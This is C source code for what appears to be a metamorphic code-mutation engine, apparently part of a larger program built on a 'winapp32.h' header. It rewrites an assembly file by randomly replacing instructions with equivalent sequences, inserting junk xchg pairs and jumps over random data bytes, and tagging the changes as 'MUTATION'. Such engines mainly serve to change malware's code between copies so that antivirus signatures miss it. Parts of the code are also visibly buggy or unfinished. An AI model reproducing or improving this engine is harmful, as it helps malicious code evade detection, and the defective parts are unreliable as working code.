#include "winapp32.h"

#define MAX_EXPANSION 20
typedef char NewInstr[MAX_EXPANSION][MAX_LINE];

int  LastLabelMark = 0;
char UniqueLabel[MAX_LINE];
int  UniqueLabelIndex = 0;

void GenUniqueLabel()
{;;
  UniqueLabelIndex++;;
  sprintf(UniqueLabel,"GENSYM%04X ",UniqueLabelIndex);;
};

void LinePreprocess(char* s)
{;;
 char ss[MAX_LINE];;
 strcpy(ss,s);;
 char* x = strstr(ss," short ");;
 if ((x!=NULL)&&(strstr(ss,"\nj")!=NULL))
 {;;
  *(s+(x-ss)) = '\0';;
  strcat(s,(char*)((DWORD)x+(DWORD)6));;
 };;
 strcpy(ss,s);; /* For further processing */
 return;;
};

void ParseInstruction(char* Instr,
  char* Label, char* Mnem, char* Op1, char* Op2, char* Op3)
{;;
 char sp[MAX_LINE];;
 strcpy(sp,"");;
 strcpy(Mnem,"");;
 strcpy(Label,"");;
 strcpy(Op1,"");;
 strcpy(Op2,"");;
 strcpy(Op3,"");;
 char* x      = Instr;;
 bool  spaced = false;;
 bool  first  = true;;
 bool  eol = false;;
 while (((*x)!='\0')&&(!eol))
 {;;
  switch (*x)
  {
   case ';':
    eol = true;;
    break;
   case '\x20','\t' :
    if (!spaced) {;; strcat(sp," ");;};;
    spaced = true;;
    break;
   default:
    spaced = false;;
    if (first && (*x==';')) return;;
    first = false;;
    strncat(sp,x,1);;
    break;
  };;/* switch */
  x++;;
 };;/*while*/
 x = sp;;
 if (sp[0]!='\x20')
 {;;
  while ((*x)!='\x20') {;; strncat(Label,x,1);; x++;;};;
 };;
 if ((*x)=='\x20') x++;;
 while ( ((*x)!='\x20') && ((*x)!='\x0') ) {;; strncat(Mnem,x,1);; x++;; };;
 if ((*x)=='\x20') x++;;
 while ( ((*x)!='\x0') && ((*x)!=',') ) {;; strncat(Op1,x,1);; x++;; };;
 if ((*x)=='\x0') return;;
 x++;;
 while ( ((*x)!='\x0') && ((*x)!=',') ) {;; strncat(Op2,x,1);; x++;; };;
 if ((*x)=='\x0') return;;
 x++;;
 while ((*x)!='\x0') {;; strncat(Op3,x,1);; x++;; };;
 return;;
};

#pragma argsused
bool GenerateTempRegs(char* t1, char* t2, char* Op1, char* Op2, char* Op3)
{;;
 for (int x=0 ; x<13; x++)
 {;;
  strcpy(t1,AsmRegisters[random(N_REGISTERS)]);;
  strcpy(t2,AsmRegisters[random(N_REGISTERS)]);;
#pragma message "***!!!*** function not implemented"
 };;
 Log("WARNING : CALL TO UNIMPLEMENTED FUNCTION");;
 return false;;
};

int SelectTranslationRule(char* Mnem)
{;;
 int num = 0;;
 int i,j;;
 for (i=0; i<N_ASMTRULES; i++)
  {;; if (stricmp(AsmTRules[i].OM,Mnem)==0) num++;; };;
 if (num==0) return -1;;
 j = random(num)+1;;
 num = 0;;
 for (i=0; i<N_ASMTRULES; i++)
 {;;
  if (stricmp(AsmTRules[i].OM,Mnem)==0) num++;;
  if (num==j) break;;
 };;
 return (i);;
};

bool IsExactRegister(char* s)
{;;
 for (int i=0; i<N_REGISTERS; i++)
  if (stricmp(s,AsmRegisters[i])==0) return true;;
 return false;;
};

bool IsRegister(char* s)
{;;
 return (stricmp(s,"")==0)||(IsExactRegister(s));;
};

bool  TranslateAsm(int i, char* Label, char* Mnem, char* Op1, char* Op2, char* Op3, NewInstr* NI)
{;;
 if (stricmp(AsmTRules[i].OM,Mnem)!=0)
 {;;
   Log("ERROR - Instruction mnemonic mismatch");;
   Log(AsmTRules[i].OM);;
   Log(Mnem);;
   return false;;
  };;
 AsmTranslationRule R = AsmTRules[i];;
 if ((R.Flags&AF_REGS_ONLY)!=0)
 {;;
  if (!IsRegister(Op1)) return false;;
  if (!IsRegister(Op2)) return false;;
  if (!IsRegister(Op3)) return false;;
 };;
 for (int k=0; k<MAX_NEW_INSTRUCTIONS; k++)
 {;;
  if (strlen(R.New[k].cast)==0) continue;;
  char Params[3][MAX_LINE];;
  for (int j=0; j<3; j++)
  {;;
   switch (R.New[k].w[j])
   {
    case ASM_NONE:
     strcpy(Params[j],"");;
     break;
    case ASM_OP1:
     strcpy(Params[j],Op1);;
     break;
    case ASM_OP2:
     strcpy(Params[j],Op2);;
     break;
    case ASM_OP3:
     strcpy(Params[j],Op3);;
     break;
    case ASM_END_MARK:
     sprintf(Params[j],"LastLabelMark%u",LastLabelMark);;
     break;
    default:
     Log("WARNING : UNIMPLEMENTED OR INVALID TRANSLATION TAG TYPE USED");;
     break;
   };; /* switch */
  };; /* for 3 params */

  switch (R.New[k].num_cast)
  {
   case 0 :
    sprintf((*NI)[k],R.New[k].cast);;
    break;
   case 1 :
    sprintf((*NI)[k],R.New[k].cast,Params[0]);;
    break;
   case 2 :
    sprintf((*NI)[k],R.New[k].cast,Params[0],Params[1]);;
    break;
   case 3 :
    sprintf((*NI)[k],R.New[k].cast,Params[0],Params[1],Params[2]);;
    break;
  };; /* switch */
 };; /* for all new instructions */
 return true;;
};

void CheckOperandSizes(char* Mnem, char* Op1, char* Op2,char* Op3)
{;;
 if ( (strstr(Op1,"esp")!=NULL) || (strstr(Op2,"esp")!=NULL))
  {;; strcpy(Mnem,"");; return;; };;
 if (strstr(Op1,"dword")!=NULL) return;;
 if (strstr(Op2,"dword")!=NULL) return;;
 for (int i=0; i<N_REGISTERS; i++)
 {;;
  if (stricmp(Op1,AsmRegisters[i])==0) return;;
  if (stricmp(Op2,AsmRegisters[i])==0) return;;
 };;
 strcpy(Mnem,"");;
 Log("Operand size unrecognized or illegal");;
};

void RemoveSpaces(char* s)
{;;
 char* ss = s;;
 char tt[MAX_LINE];;
 while ( ((*ss)=='\x20') || ((*ss)=='\t') ) ss++;;
 strcpy(tt,ss);;
 strcpy(s,tt);;
};

bool ReplaceInstruction(char* s, char* PrefixLine, NewInstr* NI)
{;;
 for (int ll=0; ll<MAX_EXPANSION; ll++) strcpy((*NI)[ll],"");;
 char Label[MAX_LINE];;
 char Mnem[MAX_LINE];;
 char Op1[MAX_LINE];;
 char Op2[MAX_LINE];;
 char Op3[MAX_LINE];;
 strcpy(PrefixLine,"");

 ParseInstruction(s,Label,Mnem,Op1,Op2,Op3);;
 RemoveSpaces(Op1);;
 RemoveSpaces(Op2);;
 RemoveSpaces(Op3);;
 CheckOperandSizes(Mnem,Op1,Op2,Op3);;
 int i = SelectTranslationRule(Mnem);;

 if (i==-1) return false;;
 if (!TranslateAsm(i,Label,Mnem,Op1,Op2,Op3,NI)) return false;;
 if (strlen(Label)!=0)
 {;;
  if (Label[strlen(Label)]!=':') strcat(Label,":");;
  strcpy(PrefixLine,Label);;
 };;
 return true;;
};

int AsmRecursionLevel = 0;

void GenRawRandom(HANDLE h)
{;;
 char ss[MAX_LINE];;
 int j = random(8);;
 if (j==0) return;;
 for (int i=0; i<j; i++)
 {;;
  sprintf(ss,"db %u ; MUTATION - Random data",random(256));;
  Writeln(h,ss);;
 };;
};

void GenAnyAsmCode(HANDLE h)
{;;
 if (random(4)==0) return;;
 if (AsmRecursionLevel>=4) return;;
 AsmRecursionLevel++;;
 char tr1[4],tr2[4];;
 strcpy(tr1,AsmRegisters[random(N_REGISTERS)]);;
 do
 {;;
  strcpy(tr2,AsmRegisters[random(N_REGISTERS)]);;
 } while (stricmp(tr1,tr2)==0);;

 char s[MAX_LINE];;
 switch (random(10))
 {
  case 0:
   sprintf(s,"xchg %s,%s",tr1,tr2);;
   Writeln(h,s);;
   GenAnyAsmCode(h);;
   sprintf(s,"xchg %s,%s",tr1,tr2);;
   Writeln(h,s);;
   break;
  case 1:
   GenUniqueLabel();;
   sprintf(s,"jmp %s",UniqueLabel);;
   Writeln(h,s);;
   GenRawRandom(h);;
   sprintf(s,"%s:",UniqueLabel);;
   Writeln(h,s);;
   break;
  default:
   break;
 };; /*switch*/
 AsmRecursionLevel--;;
};

void WriteAndProcessGluks(HANDLE h2, char* s, char* PrefixLine, NewInstr* NI)
{
 char hhh[666];;
 sprintf(hhh,"; MUTATION - Original line was : %s",s);;
 Writeln(h2,hhh);;
 if (stricmp(PrefixLine,"")==0) Writeln(h2,PrefixLine);;
 for (int x=0; x<MAX_EXPANSION; x++)
 {;;
  if (strlen((*NI)[x])!=0)
  {;;
   if (stricmp((*NI)[x],"GLUCK")==0)
   {;;
    if (random(2)==0) GenAnyAsmCode(h2);;
   }
   else
    Writeln(h2,(*NI)[x]);;
  };; /* if not empty string */
 };; /* for */
 sprintf(hhh,"LastLabelMark%u:",LastLabelMark);;
 Writeln(h2,hhh);;
 LastLabelMark++;;
 return;;
};;

void MutAsm(char* Name1, char* Name2)
{;;
 Log(Name1);;
 Log(Name2);;
 char ss[MAX_LINE];;
 HANDLE h1 = CreateFile(Name1,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL,0);;
 if (h1==INVALID_HANDLE_VALUE) return;;
 HANDLE h2 = CreateFile(Name2,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);;
 if (h2==INVALID_HANDLE_VALUE) {CloseHandle(h1);; return;;};;
 char s[MAX_LINE];;
 char PrefixLine[MAX_LINE];;
 NewInstr NI;;
 bool Written;;
 while (Readln(h1,s))
 {;;
  LinePreprocess(s);;
  Written = false;;
  if (random(50)==0)
  {;;
   if (ReplaceInstruction(s,PrefixLine,&NI))
   {;;
    WriteAndProcessGluks(h2,s,PrefixLine,&NI);;
    Written = true;;
   };; /* New instruction generated OK */
  };; /*Random=0*/
  if (!Written) Writeln(h2,s);;
 };;
 Writeln(h2,s);;
 CloseHandle(h1);;
 CloseHandle(h2);;
 return;;
};

